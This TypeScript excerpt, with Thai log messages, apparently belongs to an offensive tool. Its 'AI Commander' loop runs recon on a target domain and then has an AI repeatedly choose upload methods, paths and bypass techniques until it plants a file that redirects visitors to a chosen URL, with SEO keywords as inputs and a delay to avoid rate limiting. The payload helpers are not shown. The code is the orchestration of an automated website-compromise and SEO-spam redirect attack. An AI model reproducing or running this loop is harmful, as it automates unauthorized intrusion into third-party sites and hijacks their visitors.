    data: { lessons, failsByMethod: Object.fromEntries(failsByMethod), failsByPath: Object.fromEntries(failsByPath) },
  });

  return summary;
}

// ═══════════════════════════════════════════════════════════════
//  MAIN: AI COMMANDER LOOP
// ═══════════════════════════════════════════════════════════════

export async function runAiCommander(config: AiCommanderConfig): Promise<AiCommanderResult> {
  const {
    targetDomain,
    redirectUrl,
    maxIterations = 10,
    timeoutPerAttempt = 15000,
    seoKeywords = [],
    onEvent,
  } = config;

  const startTime = Date.now();
  const decisions: AiDecision[] = [];
  const executionResults: ExecutionResult[] = [];
  let reconData: ReconData | null = null;

  onEvent?.({
    type: "recon", iteration: 0, maxIterations,
    detail: `🚀 AI Commander เริ่มทำงาน — target: ${targetDomain}, redirect: ${redirectUrl}`,
  });

  // ─── Phase 1: RECON ───
  try {
    reconData = await performRecon(targetDomain, onEvent);
  } catch (e: any) {
    onEvent?.({
      type: "error", iteration: 0, maxIterations,
      detail: `❌ Recon failed: ${e.message}`,
    });
    return {
      success: false, iterations: 0, successfulMethod: null, uploadedUrl: null,
      redirectVerified: false, decisions, executionResults, reconData, totalDurationMs: Date.now() - startTime,
    };
  }

  // ─── Phase 2-6: AI OODA LOOP ───
  for (let iteration = 1; iteration <= maxIterations; iteration++) {
    // 2. DECIDE
    const decision = await aiDecide(reconData, redirectUrl, iteration, executionResults, seoKeywords, onEvent, maxIterations);
    decisions.push(decision);

    // 3. EXECUTE
    const execResult = await executeDecision(reconData, decision, timeoutPerAttempt, onEvent, maxIterations);
    executionResults.push(execResult);

    // 4. CHECK SUCCESS
    if (execResult.success) {
      onEvent?.({
        type: "success", iteration, maxIterations,
        detail: `🎯 สำเร็จ! File uploaded ที่ ${execResult.uploadedUrl} ด้วย method "${decision.method}" (${decision.bypassTechnique}) — ใช้ ${iteration} iterations`,
        data: {
          uploadedUrl: execResult.uploadedUrl,
          method: decision.method,
          bypass: decision.bypassTechnique,
          redirectVerified: execResult.redirectVerified,
          iterations: iteration,
        },
      });

      return {
        success: true,
        iterations: iteration,
        successfulMethod: `${decision.method} (${decision.bypassTechnique})`,
        uploadedUrl: execResult.uploadedUrl,
        redirectVerified: execResult.redirectVerified,
        decisions,
        executionResults,
        reconData,
        totalDurationMs: Date.now() - startTime,
      };
    }

    // 5. LEARN
    await aiLearn(reconData, execResult, executionResults, iteration, maxIterations, onEvent);

    // 6. ADAPT (implicit — next iteration's aiDecide will use updated history)
    onEvent?.({
      type: "adapt", iteration, maxIterations,
      detail: `🔄 AI ปรับ strategy — เตรียม iteration ${iteration + 1}/${maxIterations}...`,
    });

    // Small delay between iterations to avoid rate limiting
    await new Promise(r => setTimeout(r, 1000));
  }

  // Exhausted all iterations
  onEvent?.({
    type: "exhausted", iteration: maxIterations, maxIterations,
    detail: `⚠️ AI Commander หมด iterations (${maxIterations}) — ไม่สามารถ upload ได้สำเร็จ`,
    data: {
      totalAttempts: executionResults.length,
      methodsTried: Array.from(new Set(decisions.map(d => d.method))),
      pathsTried: Array.from(new Set(decisions.map(d => d.uploadPath))),
      bypassesTried: Array.from(new Set(decisions.map(d => d.bypassTechnique))),
    },
  });

  return {
    success: false,
    iterations: maxIterations,
    successfulMethod: null,
    uploadedUrl: null,
    redirectVerified: false,
    decisions,
    executionResults,
    reconData,
    totalDurationMs: Date.now() - startTime,
  };
}
